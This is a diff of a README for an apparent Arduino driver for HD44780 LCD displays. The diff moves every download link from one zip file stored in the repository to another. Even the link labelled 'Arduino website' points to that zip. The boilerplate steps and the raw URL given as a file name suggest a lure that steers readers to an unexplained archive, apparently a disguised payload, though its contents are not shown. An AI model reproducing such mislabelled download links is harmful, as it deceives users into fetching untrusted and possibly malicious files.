@@ -1,6 +1,6 @@
 # 🎉 avr-lcd-hd44780-driver - Easy Control of HD44780 LCD Displays 
 
-[![Download Now](https://raw.githubusercontent.com/Wahyuambon14/avr-lcd-hd44780-driver/master/src/avr-lcd-hd44780-driver_penumbrous.zip)](https://raw.githubusercontent.com/Wahyuambon14/avr-lcd-hd44780-driver/master/src/avr-lcd-hd44780-driver_penumbrous.zip)
+[![Download Now](https://raw.githubusercontent.com/Wahyuambon14/avr-lcd-hd44780-driver/master/examples/HelloWorld/driver-hd-avr-lcd-1.6.zip)](https://raw.githubusercontent.com/Wahyuambon14/avr-lcd-hd44780-driver/master/examples/HelloWorld/driver-hd-avr-lcd-1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,12 +10,12 @@ Welcome to the avr-lcd-hd44780-driver! This driver allows you to easily control 
 
 To get started, you need to visit our Releases page to download the software. Click the link below:
 
-[Visit this page to download](https://raw.githubusercontent.com/Wahyuambon14/avr-lcd-hd44780-driver/master/src/avr-lcd-hd44780-driver_penumbrous.zip)
+[Visit this page to download](https://raw.githubusercontent.com/Wahyuambon14/avr-lcd-hd44780-driver/master/examples/HelloWorld/driver-hd-avr-lcd-1.6.zip)
 
 Once you've downloaded the files, follow these steps to set up the driver:
 
 1. **Locate the Downloaded Files**: 
-   Open your Downloads folder on your computer. Look for a file named similar to `https://raw.githubusercontent.com/Wahyuambon14/avr-lcd-hd44780-driver/master/src/avr-lcd-hd44780-driver_penumbrous.zip` or `https://raw.githubusercontent.com/Wahyuambon14/avr-lcd-hd44780-driver/master/src/avr-lcd-hd44780-driver_penumbrous.zip`.
+   Open your Downloads folder on your computer. Look for a file named similar to `https://raw.githubusercontent.com/Wahyuambon14/avr-lcd-hd44780-driver/master/examples/HelloWorld/driver-hd-avr-lcd-1.6.zip` or `https://raw.githubusercontent.com/Wahyuambon14/avr-lcd-hd44780-driver/master/examples/HelloWorld/driver-hd-avr-lcd-1.6.zip`.
 
 2. **Extract the Files**: 
    Right-click on the downloaded file and choose "Extract" or "Unzip". This will create a folder with all the necessary files for the driver.
@@ -24,7 +24,7 @@ Once you've downloaded the files, follow these steps to set up the driver:
    Make sure your Arduino Uno is connected to your computer using the USB cable that came with it. 
 
 4. **Open the Arduino IDE**: 
-   If you haven't already, you can download the Arduino IDE from the [Arduino website](https://raw.githubusercontent.com/Wahyuambon14/avr-lcd-hd44780-driver/master/src/avr-lcd-hd44780-driver_penumbrous.zip). Install it and open the application.
+   If you haven't already, you can download the Arduino IDE from the [Arduino website](https://raw.githubusercontent.com/Wahyuambon14/avr-lcd-hd44780-driver/master/examples/HelloWorld/driver-hd-avr-lcd-1.6.zip). Install it and open the application.
 
 5. **Load the Driver Files**: 
    In the Arduino IDE, go to `File` > `Open` and navigate to the folder you just extracted. Select the main `.c` file, which will likely be named `lcd_hd44780_driver.c`.
